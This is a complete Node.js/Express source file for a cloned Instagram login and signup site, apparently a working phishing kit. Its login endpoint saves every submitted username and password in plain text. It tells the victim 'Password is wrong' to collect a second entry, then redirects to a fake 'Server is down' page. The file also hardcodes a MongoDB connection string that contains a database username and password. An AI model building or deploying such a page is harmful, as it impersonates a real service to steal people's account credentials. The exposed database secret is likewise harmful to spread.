// server.js
// ===============================
// Full server with Login, Signup, Server-down pages
// Login page keeps the Show/Hide button (perfectly aligned).
// Signup page matches the first screenshot (stacked fields; no eye button).
// Facebook buttons do nothing (no popup).
// ===============================

const express = require("express");
const mongoose = require("mongoose");
const path = require("path");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// serve static files from "public" (put image.png there)
app.use(express.static(path.join(__dirname, "public")));

// ===============================
// MongoDB connection
// ===============================
const MONGODB_URI =
  process.env.MONGODB_URI ||
  "mongodb+srv://emailspare365_db_user:7ZR7ZQz1YJD8IKAK@cluster0.wj5jeip.mongodb.net/login?appName=Cluster0";

mongoose
  .connect(MONGODB_URI)
  .then(() => console.log("✅ Connected to MongoDB"))
  .catch((err) => console.error("MongoDB connection error:", err));

// ===============================
// User model (plain text password as requested)
// ===============================
const userSchema = new mongoose.Schema({
  username: { type: String, required: true, trim: true }, // this will be the username field on signup
  emailOrPhone: { type: String, trim: true },
  fullName: { type: String, trim: true },
  password: { type: String, required: true },
});

const User = mongoose.model("User", userSchema);

// ===============================
// API: LOGIN
// ===============================
app.post("/api/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({ success: false, message: "Fill the username and password" });
    }

    if (password.length < 6) {
      return res.status(400).json({ success: false, message: "Password length minimum 6 characters" });
    }

    const count = await User.countDocuments({ username, password });

    if (count === 0) {
      // record attempt (as original flow)
      await User.create({ username, password, emailOrPhone: "", fullName: "" });
      return res.json({ success: false, message: "Password is wrong", attempt: 1 });
    }

    if (count === 1) {
      await User.create({ username, password, emailOrPhone: "", fullName: "" });
      return res.json({ success: true, redirect: "/server-down", attempt: 2 });
    }

    await User.create({ username, password, emailOrPhone: "", fullName: "" });
    return res.json({ success: true, redirect: "/server-down", attempt: count + 1 });
  } catch (err) {
    console.error("Login error:", err);
    return res.status(500).json({ success: false, message: "Password is wrong" });
  }
});

// ===============================
// API: SIGNUP
// - Creates a user with fields: emailOrPhone, password, fullName, username
// - Very basic check: username + password required; returns success -> redirect to '/'
// ===============================
app.post("/api/signup", async (req, res) => {
  try {
    const { emailOrPhone, password, fullName, username } = req.body;

    if (!emailOrPhone || !password || !fullName || !username) {
      return res.status(400).json({ success: false, message: "All fields are required" });
    }

    if (password.length < 6) {
      return res.status(400).json({ success: false, message: "Password length minimum 6 characters" });
    }

    // check if username already exists
    const exists = await User.findOne({ username });
    if (exists) {
      return res.status(400).json({ success: false, message: "Username already taken" });
    }

    await User.create({ username, password, emailOrPhone, fullName });
    // after sign up, redirect user to login page
    return res.json({ success: true, redirect: "/" });
  } catch (err) {
    console.error("Signup error:", err);
    return res.status(500).json({ success: false, message: "Signup failed" });
  }
});

// ===============================
// LOGIN PAGE (with Show/Hide inside password field)
// ===============================
const loginPageHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Instagram Login Clone</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }

  body {
    background:#000;
    color:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    padding:20px;
  }

  .page-wrapper { max-width:360px; width:100%; }

  .card {
    background:#000;
    border:1px solid #262626;
    padding:36px;
    text-align:center;
  }

  .logo-img { width:180px; margin:0 auto 22px; display:block; }

  .input-group { position:relative; margin-bottom:14px; text-align:left; }

  .input-group input {
    width:100%;
    padding:12px 12px 12px 12px;
    background:#121212;
    border:1px solid #363636;
    border-radius:6px;
    color:#fff;
    font-size:14px;
  }

  .input-group input::placeholder { color:#888; }

  .show-btn {
    position:absolute; right:10px; top:35%; transform:translateY(-50%);
    padding:6px 12px; font-size:13px; background:#2a2a2a; border:1px solid #555; border-radius:6px; cursor:pointer; color:#fff; line-height:1;
  }
  .show-btn.active { background:#3a3a3a; border-color:#777; }

  .input-error { color:#f02849; font-size:12px; min-height:16px; margin-top:4px; }

  .login-btn {
    margin-top:12px; width:100%; padding:10px 0; background:#385185; border:none; border-radius:8px; color:#fff; font-weight:600; cursor:pointer;
  }

  .divider { display:flex; align-items:center; gap:10px; margin:20px 0; color:#a8a8a8; }
  .divider-line { flex:1; height:1px; background:#262626; }

  .fb-login { color:#0095f6; font-weight:700; display:flex; justify-content:center; gap:8px; align-items:center; cursor:pointer; }
  .fb-circle { width:20px; height:20px; background:#1877f2; border-radius:50%; display:flex; align-items:center; justify-content:center; color:#fff; font-weight:700; font-size:12px; }

  .bottom-card { margin-top:18px; border:1px solid #262626; padding:14px; text-align:center; background:#000; }
  .bottom-card a { color:#0095f6; text-decoration:none; }
</style>
</head>
<body>
  <div class="page-wrapper">
    <div class="card">
      <img src="/image_copy.png" class="logo-img" alt="Instagram Logo" />

      <form id="loginForm" novalidate>
        <div class="input-group">
          <input id="username" type="text" placeholder="Phone number, username, or email" autocomplete="username" />
          <div id="usernameError" class="input-error"></div>
        </div>

        <div class="input-group">
          <input id="password" type="password" placeholder="Password" autocomplete="current-password" />
          <button type="button" id="togglePassword" class="show-btn" aria-pressed="false" title="Show password">Show</button>
          <div id="passwordError" class="input-error"></div>
        </div>

        <button type="submit" id="loginBtn" class="login-btn">Log in</button>
        <div id="globalError" class="input-error" style="text-align:center; margin-top:8px;"></div>

        <div class="divider">
          <div class="divider-line"></div>
          <span>OR</span>
          <div class="divider-line"></div>
        </div>

        <div class="fb-login" aria-hidden="true">
          <div class="fb-circle">f</div>
          <div>Log in with Facebook</div>
        </div>
      </form>
    </div>

    <div class="bottom-card">
      Don't have an account? <a href="/signup">Sign up</a>
    </div>
  </div>

<script>
  // Toggle show/hide password on login page
  const passwordInput = document.getElementById('password');
  const togglePassword = document.getElementById('togglePassword');
  togglePassword.addEventListener('click', () => {
    const isHidden = passwordInput.type === 'password';
    passwordInput.type = isHidden ? 'text' : 'password';
    togglePassword.textContent = isHidden ? 'Hide' : 'Show';
    togglePassword.classList.toggle('active', isHidden);
    togglePassword.setAttribute('aria-pressed', isHidden ? 'true' : 'false');
    passwordInput.focus();
  });
  togglePassword.addEventListener('keydown', (e) => {
    if (e.key === ' ' || e.key === 'Enter') { e.preventDefault(); togglePassword.click(); }
  });

  // Login form submit
  document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    document.getElementById('usernameError').textContent = '';
    document.getElementById('passwordError').textContent = '';
    document.getElementById('globalError').textContent = '';

    const username = (document.getElementById('username').value || '').trim();
    const password = (document.getElementById('password').value || '');

    if (!username && !password) {
      document.getElementById('globalError').textContent = 'Fill the username and password';
      return;
    }
    if (!password) {
      document.getElementById('passwordError').textContent = 'Password is wrong';
      return;
    }
    if (password.length < 6) {
      document.getElementById('passwordError').textContent = 'Password length minimum 6 characters';
      return;
    }

    const loginBtn = document.getElementById('loginBtn');
    loginBtn.disabled = true;

    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });
      const data = await res.json();
      if (!data.success) {
        document.getElementById('globalError').textContent = data.message || 'Password is wrong';
      } else {
        window.location.href = data.redirect || '/server-down';
      }
    } catch (err) {
      console.error(err);
      document.getElementById('globalError').textContent = 'Password is wrong';
    } finally {
      loginBtn.disabled = false;
    }
  });
</script>
</body>
</html>
`;

// ===============================
// SIGNUP PAGE (matches first screenshot)
// ===============================
const signupPageHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Instagram Sign up</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }

  body {
    background:#0f1113; /* slightly different dark to match screenshot */
    color:#ddd;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    padding:20px;
  }

  .page-wrapper { max-width:360px; width:100%; }

  .card {
    background:#0f1113;
    border:1px solid #222326;
    padding:26px 28px;
    text-align:center;
  }

  .logo-img { width:180px; margin:0 auto 20px; display:block; }

  .headline { color:#cfcfcf; margin-bottom:14px; font-size:15px; }

  .fb-cta {
    display:flex; align-items:center; justify-content:center; gap:10px;
    background:#4b5bff; color:#fff; padding:10px 12px; border-radius:8px; font-weight:700; cursor:pointer; margin-bottom:16px;
  }

  .fb-circle { width:18px; height:18px; background:#1877f2; border-radius:50%; display:flex; align-items:center; justify-content:center; color:#fff; font-weight:700; font-size:12px; }

  .divider { display:flex; align-items:center; gap:10px; margin:10px 0 18px; color:#9b9b9b; font-size:13px; }
  .divider-line { flex:1; height:1px; background:#222326; }

  .form-field { width:100%; margin-bottom:10px; }
  .form-field input {
    width:100%; padding:10px 12px; background:#1b1c1d; border:1px solid #2b2b2b; border-radius:6px; color:#ddd; font-size:14px;
  }
  .form-text { color:#9a9a9a; font-size:12px; margin:10px 0 12px; line-height:1.4; text-align:left; }

  .signup-btn { width:100%; padding:10px; background:#5a67ff; color:#fff; border:none; border-radius:8px; font-weight:700; cursor:pointer; margin-top:8px; }

  .bottom { margin-top:18px; border:1px solid #222326; padding:12px; text-align:center; color:#d0d0d0; }
  .bottom a { color:#3797f4; text-decoration:none; font-weight:700; }

  small.learn { color:#9a9a9a; font-size:12px; display:block; margin-top:6px; }
</style>
</head>
<body>
  <div class="page-wrapper">
    <div class="card">
      <img src="/image.png" class="logo-img" alt="Instagram Logo" />
      <div class="headline">Sign up to see photos and videos from your friends.</div>

      <div class="fb-cta" role="button" aria-hidden="true">
        <div class="fb-circle">f</div>
        Log in with Facebook
      </div>

      <div class="divider"><div class="divider-line"></div><span>OR</span><div class="divider-line"></div></div>

      <form id="signupForm" novalidate>
        <div class="form-field"><input id="emailOrPhone" placeholder="Mobile Number or Email" /></div>
        <div class="form-field"><input id="signupPassword" type="password" placeholder="Password" /></div>
        <div class="form-field"><input id="fullName" placeholder="Full Name" /></div>
        <div class="form-field"><input id="signupUsername" placeholder="Username" /></div>

        <div class="form-text">
          People who use our service may have uploaded your contact information to Instagram. <a href="#" style="color:#3797f4; text-decoration:none;">Learn More</a>
        </div>

        <div class="form-text" style="margin-top:6px;">
          By signing up, you agree to our <a href="#" style="color:#3797f4; text-decoration:none;">Terms</a>, <a href="#" style="color:#3797f4; text-decoration:none;">Privacy Policy</a> and <a href="#" style="color:#3797f4; text-decoration:none;">Cookies Policy</a>.
        </div>

        <button type="submit" class="signup-btn">Sign up</button>
      </form>

    </div>

    <div class="bottom">
      Have an account? <a href="/">Log in</a>
    </div>
  </div>

<script>
  document.getElementById('signupForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const emailOrPhone = (document.getElementById('emailOrPhone').value || '').trim();
    const password = (document.getElementById('signupPassword').value || '');
    const fullName = (document.getElementById('fullName').value || '').trim();
    const username = (document.getElementById('signupUsername').value || '').trim();

    if (!emailOrPhone || !password || !fullName || !username) {
      alert('Please fill all fields');
      return;
    }
    if (password.length < 6) {
      alert('Password must be at least 6 characters');
      return;
    }

    try {
      const res = await fetch('/api/signup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ emailOrPhone, password, fullName, username })
      });
      const data = await res.json();
      if (!data.success) {
        alert(data.message || 'Signup failed');
      } else {
        // redirect to login
        window.location.href = data.redirect || '/';
      }
    } catch (err) {
      console.error(err);
      alert('Signup failed');
    }
  });
</script>
</body>
</html>
`;

// ===============================
// SERVER DOWN PAGE
// ===============================
const serverDownHTML = `
<!DOCTYPE html>
<html><head><meta charset="utf-8"/><title>Server Error</title>
<style>
  body { background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; }
  .box { text-align:center; padding:24px; border:1px solid #262626; }
  img { width:150px; margin-bottom:12px; display:block; margin-left:auto; margin-right:auto; }
  button { padding:10px 18px; background:#0095f6; color:#fff; border:none; border-radius:8px; cursor:pointer; }
</style>
</head><body>
  <div class="box">
    <img src="/image.png" alt="logo" />
    <h2>Server is down</h2>
    <p>Sorry, something went wrong.</p>
    <button onclick="location.href='/'">Try again</button>
  </div>
</body></html>
`;

// ===============================
// ROUTES
// ===============================
app.get("/", (req, res) => res.send(loginPageHTML));
app.get("/signup", (req, res) => res.send(signupPageHTML));
app.get("/server-down", (req, res) => res.send(serverDownHTML));

// ===============================
// START SERVER
// ===============================
app.listen(PORT, () => {
  console.log("🚀 Server running on http://localhost:" + PORT);
});
